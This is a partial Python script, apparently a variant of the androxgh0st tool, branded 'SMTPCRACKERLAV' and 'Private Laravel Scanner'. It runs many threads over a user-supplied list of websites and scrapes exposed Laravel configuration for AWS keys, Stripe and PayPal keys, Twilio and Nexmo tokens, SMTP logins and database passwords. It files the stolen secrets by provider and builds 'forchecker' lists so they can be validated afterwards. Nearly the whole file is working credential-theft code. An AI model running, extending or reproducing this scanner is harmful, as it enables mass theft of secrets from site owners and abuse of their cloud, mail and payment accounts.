...
try:
	os.mkdir('SMTPCRACKERLAV')
except:
	pass
try:
	os.mkdir('SMTPCRACKERLAV/forchecker')
except:
	pass
try:
	os.mkdir('SMTPCRACKERLAV/logsites')
except:
	pass
...
class androxgh0st:
	def payment_api(self, text, url):
		if "PAYPAL_" in text:
			save = open('SMTPCRACKERLAV/paypal_sandbox.txt','a')
			save.write(url+'\n')
			save.close()
			return True
			...
			save = open('SMTPCRACKERLAV/STRIPE.txt', 'a')
			save.write(remover+'\n\n')
			save.close()
			saveurl = open('SMTPCRACKERLAV/logsites/stripesite.txt','a')
		...
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				...
				if aws_key == "" and aws_sec == "":
					...
					remover = str(build).replace('\r', '')
					save = open('SMTPCRACKERLAV/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('SMTPCRACKERLAV/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('SMTPCRACKERLAV/forchecker/aws_secretkey.txt','a')
				...
				if aws_key == "" and aws_sec == "":
					...
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('SMTPCRACKERLAV/aws_sns_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
				...
				if "AKIA" in str(text):
					save = open('SMTPCRACKERLAV/AKIA.txt','a')
					save.write(str(url)+'\n')
					save.close()
				return False
		except:
	...
	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				...
				remover = str(build).replace('\r', '')
				save = open('SMTPCRACKERLAV/TWILIO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open('SMTPCRACKERLAV/forchecker/twilio.txt','a')
	...
	def get_nexmo(self, text, url):
		try:
			if "NEXMO" in text:
				...
				remover = str(build).replace('\r', '')
				save = open('SMTPCRACKERLAV/NEXMO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open('SMTPCRACKERLAV/forchecker/nexmo.txt','a')
				save2.write(remover2+'\n')
				save2.close()
				return True
				...
				remover = str(build).replace('\r', '')
				save = open('SMTPCRACKERLAV/EXOTEL.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
				...
				remover = str(build).replace('\r', '')
				save = open('SMTPCRACKERLAV/ONESIGNAL.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
				...
				remover = str(build).replace('\r', '')
				save = open('SMTPCRACKERLAV/TOKBOX.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
				...
				remover = str(build).replace('\r', '')
				save = open('SMTPCRACKERLAV/PLIVO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
			...
			if "MAIL_HOST" in text:
				...
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					...
					if '.amazonaws.com' in mailhost:
						...
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('SMTPCRACKERLAV/smtp_aws.txt', 'a')
						save2.write(remover+'\n\n')
						save2.close()
					elif 'sendgrid' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/sendgrid.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
						build_forchecker = str(mailhost)+"|"+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover2 = str(build_forchecker).replace('\r', '')
						save3 = open('SMTPCRACKERLAV/forchecker/sendgrid.txt','a')
						save3.write(remover2+'\n')
						save3.close()
					elif 'office365' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/office.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif '1and1' in mailhost or '1und1' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/1and1.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'zoho' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/zoho.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mandrillapp' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/mandrill.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mailgun' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/mailgun.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'emailsrvr' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/emailsrvr.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'ionos' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/ionos.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					else:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('SMTPCRACKERLAV/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					return True
			else:
	...
	def get_database(self, text, url):
		try:
			if "DB_HOST" in text:
				...
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(db_host)+'\nDB_PORT: '+str(db_port)+'\nDB_NAME: '+str(db_name)+'\nDB_USER: '+str(db_user)+'\nDB_PASS: '+str(db_pass)
				remover = str(build).replace('\r', '')
				save = open('SMTPCRACKERLAV/DATABASE.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(url)+"|"+str(db_host)+"|"+str(db_port)+"|"+str(db_user)+"|"+str(db_pass)+"|"+str(db_name)
				remover2 = str(build_forchecker).replace('\r', '')
				if str(db_user) == "root":
					save3 = open('SMTPCRACKERLAV/forchecker/database_root.txt','a')
				else:
					save3 = open('SMTPCRACKERLAV/forchecker/database.txt','a')
				save3.write(remover2+'\n')
				save3.close()
				return True
			else:
...
def main(url):
	resp = False
	try:
		text = '\033[32;1mSMTPCRACKER:))\033[0m '+url
		...
		if resp:
			...
			save3 = open('SMTPCRACKERLAV/logsites/vulnerable.txt','a')
			save3.write(remover2+'\n')
			save3.close()
			...
			text += ' | \033[1;37mCan Not Get All Results ./SMTPCRACKERLAV\033[1;37m'
			save = open('SMTPCRACKERLAV/logsites/not_vulnerable.txt','a')
			asu = str(url).replace('\r', '')
			save.write(asu+'\n')
			save.close()
	except:
		text = '\033[31;1mSMTPCRACKER:((\033[0m '+url
		text += ' | \033[31;1mCan not get access to sites IP BLOCK ./SMTPCRACKER\033[0m'
		save = open('SMTPCRACKERLAV/logsites/exception_sites.txt','a')
		asu = str(url).replace('\r', '')
		save.write(asu+'\n')
		save.close()
	printf(text)
...
if __name__ == '__main__':
	print(''' \033[0;32m    
    _   _ _   _ _   _ _____ ___   __   _____  _____  ______    
   | | | | | | | \ | |_   _/ _ \ /  | |____ ||____ ||___  /    
   | |_| | | | |  \| | | |/ /_\ \`| |     / /    / /   / /_  __
   |  _  | | | | . ` | | ||  _  | | |     \ \    \ \  / /\ \/ /
   | | | | |_| | |\  | | || | | |_| |_.___/ /.___/ /./ /  >  < 
   \_| |_/\___/\_| \_/ \_/\_| |_/\___/\____/ \____/ \_/  /_/\_\
                                                            
    Private Laravel Scanner Grab a lot of fresh SMTPCRACKERLAV''')
	try:
		...
		tanya = raw_input("Do you want to continue [Y/N] ")
		...
		try:
			...
			try:
				lists = raw_input("\033[0;32mEnter Your List ./SMTPCRACKERLAV ")
				readsplit = open(lists).read().splitlines()
			except:
				print("\033[0;32mWrong file lol try again ./SMTPCRACKERLAV ")
				exit()
			try:
				numthread = raw_input("\033[0;32mEnter Your Threads ./SMTPCRACKERLAV ")
			except:
				print("\033[0;32mWrong Thread Number ./SMTPCRACKERLAV")
				exit()
